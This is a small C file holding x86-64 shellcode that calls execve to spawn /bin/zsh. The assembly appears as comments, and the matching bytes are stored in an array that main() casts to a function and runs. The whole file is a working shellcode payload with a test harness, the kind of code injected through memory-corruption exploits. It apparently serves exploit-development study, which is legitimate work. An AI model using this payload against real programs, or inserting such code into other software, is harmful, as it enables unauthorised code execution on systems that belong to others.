// ;this code spawns a new shell (/bin/zsh)
// global _start

// section .text

// _start:

	
	
// 	;int execve(const char *filename, char *const argv[],char *const envp[])
// 	xor rsi,	rsi			;clear rsi
// 	push		rsi			;push null on the stack
// 	mov 	rdi,	0x68737a2f6e69622f	 ;/bin/zsh in reverse order
// 	push	rdi
// 	push	rsp		
// 	pop	rdi				;stack pointer to /bin/zsh
// 	mov 	al,	59			;sys_execve
// 	cdq					;sign extend of eax
// 	syscall
 
int main(void) {
    char shellcode[] = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x7a\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05";
 
    (*(void (*)()) shellcode)();
     
    return 0;
}

